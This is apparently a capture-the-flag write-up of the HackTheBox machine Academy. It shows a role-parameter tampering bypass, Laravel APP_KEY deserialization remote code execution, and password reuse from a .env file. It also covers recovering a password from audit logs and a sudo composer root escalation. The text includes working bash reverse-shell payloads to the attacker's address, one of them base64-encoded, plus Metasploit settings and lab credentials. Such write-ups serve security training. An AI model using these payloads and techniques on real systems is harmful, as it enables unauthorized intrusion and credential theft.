---
title: HTB: Academy
url: https://0xdf.gitlab.io/2021/02/27/htb-academy.html
date: 2021-02-27T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, ctf, htb-academy, nmap, ubuntu, php, laravel, vhosts, gobuster, cve-2018-15133, deserialization, metasploit, password-reuse, credentials, adm, logs, aureport, composer, gtfobins
---

![Academy](https://0xdfimages.gitlab.io/img/academy-cover.png)

HackTheBox releases a new training product, Academy, in the most HackTheBox way possible - By putting out a vulnerable version of it to hack on. There’s a website with a vulnerable registration page that allows me to register as admin and get access to a status dashboard. There I find a new virtual host, which is crashing, revealing a Laravel crash with data including the APP\_KEY. I can use that to create a serialized payload to submit as an HTTP header or cookie to get execution. From there, I’ll reuse database creds to get to the next user, and then find more creds in auth logs, and finally get root with sudo composer.

## Box Info

| Name | [Academy](https://hackthebox.com/machines/academy)  [Academy](https://hackthebox.com/machines/academy) [Play on HackTheBox](https://hackthebox.com/machines/academy) |
| --- | --- |
| Release Date | [07 Nov 2020](https://twitter.com/hackthebox_eu/status/1324735870029758464) |
| Retire Date | 27 Feb 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Academy |
| Radar Graph | Radar chart for Academy |
| First Blood User | 00:21:04[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 00:47:31[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creators | [egre55 egre55](https://app.hackthebox.com/users/1190)  [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22) and HTTP (80), and 33060:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.215
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 06:26 EST
Nmap scan report for 10.10.10.215
Host is up (0.045s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE                                   
22/tcp    open  ssh                                       
80/tcp    open  http
33060/tcp open  mysqlx                                    

Nmap done: 1 IP address (1 host up) scanned in 9.98 seconds   

root@kali# nmap -p 22,80,33060 -sC -sV -oA scans/tcpscripts 10.10.10.215
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 06:27 EST
Nmap scan report for 10.10.10.215
Host is up (0.012s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.80%I=7%D=11/9%Time=5FA927A7%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
...[snip]...
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.21 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal. I don’t know what port 33060 is, but it could be MySQL related, as that defaults to 3306.

### Website - TCP 80

#### Site

An HTTP GET to 10.10.10.215 returns a 302 redirect to `academy.htb`:

```

HTTP/1.1 302 Found
Date: Mon, 09 Nov 2020 11:33:54 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://academy.htb/
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

After adding the line `10.10.10.215 academy.htb` to `/etc/hosts`, I’m able to load the page:

![image-20201109063341108](https://0xdfimages.gitlab.io/img/image-20201109063341108.png)

I’m able to register an account at the “REGISTER” link (`/register.php`), and then I can login with the “LOGIN” link (`/login.php`). The site is a shell of the new HTB Academy site, except basically none of the links work:

[![image-20201109130936808](https://0xdfimages.gitlab.io/img/image-20201109130936808.png)](https://0xdfimages.gitlab.io/img/image-20201109130936808.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20201109130936808.png)

Interestingly, regardless of my username, the profile picture at the top left is for egre55, one of the box’s creators.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x p
hp -t 40 -o scans/gobuster-academy.htb-php                                
===============================================================
Gobuster v3.0.1                                                          
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb
[+] Threads:        40                                                   
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403                
[+] User Agent:     gobuster/3.0.1                                       
[+] Extensions:     php                                                  
[+] Timeout:        10s                                                  
===============================================================
2020/11/09 06:35:58 Starting gobuster
===============================================================
/index.php (Status: 200)
/register.php (Status: 200)
/admin.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/config.php (Status: 200)
/home.php (Status: 302)
===============================================================
2020/11/09 06:37:20 Finished
===============================================================

```

I’ve already interacted with most of these, but `/admin.php` is new. It also presents a similar login form, but I’m not able to log in.

## Shell as www-data

### Admin Web Access

The POST request to register a new user is interesting:

```

POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://academy.htb/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Connection: close
Cookie: PHPSESSID=nkujfeq4bs07abvgvfdrmb5adt; ajs_anonymous_id=%2256f05019-1a83-45b8-bd08-d7bfe2a5ce13%22; _fbp=fb.1.1604923350130.1429558409
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

uid=0xdf&password=0xdf&confirm=0xdf&roleid=0

```

While the `uid` (user id) and double password fields are expected, `roleid` is interesting. I’ll register again, but this time I’ll use Burp proxy to intercept the POST and change `roleid` to 1.

```

POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://academy.htb/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Connection: close
Cookie: PHPSESSID=nkujfeq4bs07abvgvfdrmb5adt; ajs_anonymous_id=%2256f05019-1a83-45b8-bd08-d7bfe2a5ce13%22; _fbp=fb.1.1604923350130.1429558409
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

uid=0xdfadmin&password=0xdf&confirm=0xdf&roleid=1

```

It works just fine. The new account can log in just as before, but now it can also log in at `/admin.php`, providing access to the “Academy Launch Planner”:

![image-20201109135622593](https://0xdfimages.gitlab.io/img/image-20201109135622593.png)

The most interesting part here is the new subdomain, `dev-staging-01.academy.htb`.

### Laravel Exploit

#### Enumeration

Visiting `dev-staging-01.academy.htb` actually returns an HTTP 500 error, but with a page with a lot of debugging:

![image-20201109143736901](https://0xdfimages.gitlab.io/img/image-20201109143736901.png)

The various logs above suggest this is running the [Laravel](https://laravel.com/) PHP framework.

#### Vulnerability Identification

Looking for vulnerabilities turned up [CVE-2018-15133](https://www.exploit-db.com/exploits/47129), a deserialization error in a HTTP header that can lead to code execution. [This post](https://www.programmersought.com/article/29875427507/) has a bunch of interesting detail on how the exploit works. To make it work, an attacker needs to have the secret `APP_KEY` from the Laravel instance. Luckily for me, this crash page reports it in the server data:

![image-20201109143918904](https://0xdfimages.gitlab.io/img/image-20201109143918904.png)

#### Shell via Metasploit

I’ll fire up `msfconsole` and use this exploit:

```

msf5 > use exploit/unix/http/laravel_token_unserialize_exec
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(unix/http/laravel_token_unserialize_exec) >

```

I’ll set the necessary options:

```

msf5 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215
RHOSTS => 10.10.10.215
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0
LHOST => 10.10.14.19
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set LPORT 443
LPORT => 443

```

Running it drops me at an empty line:

```

msf5 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.19:443 
[*] Command shell session 1 opened (10.10.14.19:443 -> 10.10.10.215:41842) at 2020-11-09 14:51:41 -0500

```

But I can run commands:

```

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I can also get a full TTY:

```

python3 -c 'import pty;pty.spawn("bash")'
www-data@academy:/var/www/html/htb-academy-dev-01/public$

```

I can’t use the CTRL-z, `stty raw -echo; fg` trick here inside of Metasploit, but this will suffice.

#### Shell Manually

[This post](https://blog.truesec.com/2020/02/12/from-s3-bucket-to-laravel-unserialize-rce/) from Truesec shows a very similar attack. The difference is that they put the serialized payload into a cookie. I created a local copy of their PHP exploit script, and made a few changes.
- Update the `app_key` variable with the one from the Academy application:

  ```

  $app_key = 'base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=';

  ```
- I was too lazy to set up certificates for the OpenSSL reverse shell described in the post, so I changed the payload to my own reverse shell. At first I tried:

  ```

  $payload = 'system(\'bash -c "bash -i >& /dev/tcp/10.10.14.19/443 0>&1"\');';

  ```

  When I tried to generate the payload, it threw errors:

  ```

  oxdf@parrot$ php gen_serialized.php 
  sh: 1: Syntax error: Bad fd number
  eyJpdiI6Ikpkd1hHSUpmSkxMUUxoK0o5QkNyK0E9PSIsInZhbHVlIjoiK0hxSjNlVTQ3SE55Vll1UDJ1K0ZmZz09IiwibWFjIjoiMzhiNjg1OTgyMGI5YjM0Mzc5ODdhYTY5NTViMzkxODlmYjY2YzUyMzEwNTRmMjE5ZWI3YzYyN2ZkZDFkMjg5ZCJ9

  ```

  That error message tells me that it’s trying to interpret something that’s in the payload string from within PHP. My solution was to base64 encode the payload:

  ```

  $payload = 'system(\'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMQo=" | base64 -d | bash\');';

  ```
- Change the path to `phpggc` to be what it is on my system (I downloaded it from [Github](https://github.com/ambionics/phpggc) with `git clone` in `/opt`):

  ```

  $chain = shell_exec('/opt/phpggc/phpggc '.$chain_name.' "'.$payload.'"');

  ```
- Removed the `urlencode` on the last line:

  ```

  // Print the results
  //die(urlencode(base64_encode($json)));
  die(base64_encode($json));

  ```

  This actually doesn’t matter when using a cookie, but when I tried to use the `X-XSRF-TOKEN` header, urlencoding will break it.

I can run it to generate a payload:

```

oxdf@parrot$ php gen_serialized.php 
eyJpdiI6IjE0Zk9BWFRHSmhvRnd2TytHYWsrS2c9PSIsInZhbHVlIjoiSDVpXC92RUJHNElmUHpON1pFU0d6bjcrSTFcLzdBXC9ISEh2S1RBODZIQjJUTlppK2Y3cEdNUkd5TEVnbFM3R0g5MWFsS1wvekFZejBtd0hXNnhMVGk0Nm9OaVNPZk5VbjVaSGV1bXVCNUx1SWlzNTRqN1pqXC9RR1lCbnFXRkZyR21FY2xEaWZoOUZocjRhdjVnRmF1RTF2U3lraHdUazV1c25CeFNua2VYRHd4Ukp3a21na0Q0QmhBK3dBeVloeUc5N1dFSGdWSjRyZ1pkWEliUDg2WEV1dEF4QUhQQk9QMVBGWXFXZGhXUTlXb000clFvZGljWUc3aEo0cys0YjE1UE5oS1VRK2pRdlpsREtmazZqWDIzZktiWVdNTmVScmdWM3AydEYxQUk0aERRdTFicEtrWDUwXC9xMHNQTnpkRzB2eWRUeWNMd3hjQ1hoMTdkUDlSWE5QRytRNE5FZktVOEdsaUhsSE5wcHFVSUJsUFp2RUpqM3lCSkpPdHBiTklGREtWNUF1bmYzMktrRXMrMTVnWWN1QjRDa20xWE5UZzhBb2xCZWpFXC9LZmtDY0tsVGxpOUpISWR4eDlhNGZ4XC9WMldZeE5SYTloWVdPOXNlOW9xZHpIVlZRbm1yWWNqRmM4WXRZUWFpOTZIcHNrcWlKd09GTHlRYmlpenhhVFN6UFREU0xTQXBIXC9NXC9Db3U5SFNOenZrbUFuSXhHbVdYZ0taRjVFUW9tWHFvZWJyczJDbmE1VjBIcGJ1SFdrcllBM3haQ1p0ZURFdStXMzBcL1B4M2lkK2VNUFwvYzlGbHUyanpkRE83MGlPXC9IZFBOZ01DcDFlVjdmeXdVSkpaampDM1g1TDdFaWFWbHNzVkROYWl2WU9odHFSUCtJd3RSZ1BiZkhhNmFsRjRrT2YxaFZEbE5mMWQzTVdTTnhodnNDZzBlUGR3UTZuYk9rdWxPdjBHM1RBb1dLV2VLNFVaV0VPNktPV0JCVlwvSExodVp6cjlPRWFDbDV1ZTdJQmV2aTNFOGpPU2lkakpjTHJuNWs1a3I2d2tBZW9JN0dZM0oxREk3YTY1OFZXUkZhcHlQVW5RY1hMOHhUdTRIZFwvbm5cL1ZHWXBYUE8iLCJtYWMiOiJjNDRkZTM0NzA2Njk2NmVmYjA2ODRlODQyM2UwMzVjMDAyZTUyMzA0N2QwNTgwMDdkMTExN2Y1ZDM1YTc0ZDJjIn0=

```

I can run it in `curl` just like in the post and get a shell:

```

oxdf@parrot$ curl -s -H "Cookie: laravel_session=$(php gen_serialized.php);" http://dev-staging-01.academy.
htb
<!DOCTYPE html><!--                                                                                                                           

UnexpectedValueException: The stream or file &quot;/var/www/html/htb-academy-dev-01/storage/logs/laravel.log&quot; could not be opened in append mode: failed to open stream: Permission denied in file /var/www/html/htb-academy-dev-01/vendor/monolog/monolog/src/Monolog/Handler/StreamHandler.php on line 110
Stack trace:
...[snip]...

```

At `nc`:

```

oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.215] 58018
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

The Metasploit exploit and other post talk about putting the payload into the `X-XSRF-TOKEN` header. This took a bit of playing around with to get it to work, but it needs to be in a POST request, and to make sure that the payload *isn’t* url-encoded:

```

oxdf@parrot$ curl -s -X POST -H "X-XSRF-TOKEN: $(php gen_serialized.php);" http://dev-staging-01.academy.htb
...[snip]...

```

And a shell comes back to `nc`.

In either of these shells, I can upgrade to PTY:

```

www-data@academy:/var/www/html/htb-academy-dev-01/public$ python3 -c 'import pty;pty.spawn("bash")'
www-data@academy:/var/www/html/htb-academy-dev-01/public$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@academy:/var/www/html/htb-academy-dev-01/public$

```

## Shell as cry0l1t3

### Enumerate Users

There’s a handful of users on this box:

```

www-data@academy:/home$ ls 
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n

```

`user.txt` is in cry0l1t3’s homedir, but I can’t read it as www-data:

```

www-data@academy:/home$ ls cry0l1t3/
user.txt

```

### Find Database Password

In the root directory for the Academy application, `/var/www/html/academy`, there’s a `.env` file, which contains configuration information, including the connection information for the database:

```

www-data@academy:/var/www/html/academy$ cat .en
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

...[snip]...

```

### Shell

This password (mySup3rP4s5w0rd!!) is valid as the password for cry0l1t3:

```

www-data@academy:/home$ su - cry0l1t3
su - cry0l1t3
Password: mySup3rP4s5w0rd!!

$ id
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)

```

SSH works as well:

```

root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# sshpass -p 'mySup3rP4s5w0rd!!' ssh cry0l1t3@10.10.10.215
...[snip]...
$ 

```

Either way, I can grab `user.txt`:

```

$ bash
cry0l1t3@academy:~$ cat user.txt
f4ebb662************************

```

## Shell as mrb3n

### Privileges

The cry0l1t3 user is in the adm group:

```

cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)

```

According to [the docs](https://wiki.debian.org/SystemGroups), this group:

> Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.

### Log Auditing

After a bit of time running different `grep` commands across all the log data, I came across `aureport`, a tool that will parse the audit logs for various things. [This page](https://support.oracle.com/knowledge/Oracle%20Linux%20and%20Virtualization/2239220_1.html) suggests the the `--tty` option can show plaintext passwords. I gave it a try, and it dumped mrb3n’s password on line 2:

```

cry0l1t3@academy:~$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
6. 08/12/2020 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/2020 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
8. 08/12/2020 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
9. 08/12/2020 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/2020 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/2020 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/2020 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/2020 02:33:36 109 0 ? 1 sh "exit",<nl>

```

That is just decoding what’s in these lines from `/var/log/audit/audit.log.3`:

```

type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
type=USER_AUTH msg=audit(1597199304.778:85): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:authentication grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=USER_ACCT msg=audit(1597199304.778:86): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:accounting grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'
type=CRED_ACQ msg=audit(1597199304.778:87): pid=2520 uid=1002 auid=0 ses=1 msg='op=PAM:setcred grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su" hostname=academy addr=? terminal=tty1 res=success'

```

The first line above is recording that in `sh` the user with uid 1002 (cry0l1t3) ran a command. The command is stored as hex as `data`. I can decode that to see the command:

```

root@kali# echo "7375206D7262336E0A" | xxd -r -p
su mrb3n

```

On the next line, now in the process `su` (started on the previous line), the data is `6D7262336E5F41634064336D79210A`, or:

```

root@kali# echo "6D7262336E5F41634064336D79210A" | xxd -r -p
mrb3n_Ac@d3my!

```

### su / SSH

With his password, I can get a shell as mrb3n:

```

cry0l1t3@academy:~$ su mrb3n -
Password: 
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)

```

This also works over SSH:

```

root@kali# sshpass -p 'mrb3n_Ac@d3my!' ssh mrb3n@10.10.10.215
...[snip]...
$ 

```

## Shell as root

### Enumeration

mrb3n can run `sudo /usr/bin/composer`:

```

mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer

```

[Composer](https://getcomposer.org/) is a dependency manager for PHP.

### GTFObins

[gtfobins has a page on composer](https://gtfobins.github.io/gtfobins/composer/#sudo), so I’ll follow the instructions from the `sudo` section:

```

mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)

```

That’s a root shell! And now `root.txt`:

```

root@academy:~# cat root.txt
23caa2ea************************

```